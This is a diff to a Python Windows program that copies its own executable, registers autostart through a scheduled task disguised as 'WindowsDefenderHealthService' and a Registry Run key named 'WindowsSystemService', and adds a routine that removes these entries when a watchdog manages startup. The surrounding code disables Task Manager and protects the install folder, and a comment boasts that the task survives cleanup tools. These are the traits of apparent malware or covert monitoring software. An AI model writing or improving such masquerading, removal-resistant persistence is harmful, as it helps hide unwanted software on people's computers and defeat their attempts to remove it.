@@ -498,8 +498,8 @@ def set_taskmgr_state(enable=True):
         logger.error(f"set_taskmgr_state failed: {e}")
         return False
 
-def check_integrity(target_dir, target_exe, current_exe):
-    """Check file presence, copy if needed, register autostart via Task Scheduler + Registry fallback."""
+def check_integrity(target_dir, target_exe, current_exe, register_autostart=True):
+    """Check file presence, copy if needed, and optionally register autostart."""
     try:
         os.makedirs(target_dir, exist_ok=True)
 
@@ -509,22 +509,25 @@ def check_integrity(target_dir, target_exe, current_exe):
             shutil.copy2(current_exe, target_exe)
             logger.info(f"Copied executable to {target_exe}")
 
-        # Primary: Task Scheduler (survives Registry cleanup tools)
-        _setup_autostart_task(target_exe)
+        if register_autostart:
+            # Primary: Task Scheduler (survives Registry cleanup tools)
+            _setup_autostart_task(target_exe)
 
-        # Fallback: Registry Run key
-        try:
-            import winreg
-            key = winreg.OpenKey(
-                winreg.HKEY_CURRENT_USER,
-                r"Software\Microsoft\Windows\CurrentVersion\Run",
-                0, winreg.KEY_SET_VALUE
-            )
-            winreg.SetValueEx(key, "WindowsSystemService", 0, winreg.REG_SZ, target_exe)
-            winreg.CloseKey(key)
-            logger.info("Registry fallback persistence added")
-        except Exception as e:
-            logger.warning(f"Registry fallback failed: {e}")
+            # Fallback: Registry Run key
+            try:
+                import winreg
+                key = winreg.OpenKey(
+                    winreg.HKEY_CURRENT_USER,
+                    r"Software\Microsoft\Windows\CurrentVersion\Run",
+                    0, winreg.KEY_SET_VALUE
+                )
+                winreg.SetValueEx(key, "WindowsSystemService", 0, winreg.REG_SZ, target_exe)
+                winreg.CloseKey(key)
+                logger.info("Registry fallback persistence added")
+            except Exception as e:
+                logger.warning(f"Registry fallback failed: {e}")
+        else:
+            _remove_main_autostart()
 
         # Protect installation folder
         protect_folder(target_dir)
@@ -599,6 +602,39 @@ def _setup_autostart_task(exe_path):
         logger.info(f"Task Scheduler autostart registered: {task_name}")
     except Exception as e:
         logger.warning(f"_setup_autostart_task failed: {e}")
+
+
+def _remove_main_autostart():
+    """Remove main-process startup entries when watchdog manages startup."""
+    task_name = "WindowsDefenderHealthService"
+    try:
+        subprocess.run(
+            ["schtasks", "/delete", "/tn", task_name, "/f"],
+            creationflags=subprocess.CREATE_NO_WINDOW,
+            timeout=10,
+            check=False,
+        )
+        logger.info(f"Main autostart task removed (if existed): {task_name}")
+    except Exception as e:
+        logger.warning(f"Failed removing task '{task_name}': {e}")
+
+    try:
+        import winreg
+        key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run",
+            0,
+            winreg.KEY_SET_VALUE,
+        )
+        try:
+            winreg.DeleteValue(key, "WindowsSystemService")
+            logger.info("Registry fallback persistence removed")
+        except FileNotFoundError:
+            pass
+        finally:
+            winreg.CloseKey(key)
+    except Exception as e:
+        logger.warning(f"Failed removing registry fallback: {e}")
 
 # ==============================================================================
 # FILE OPERATIONS
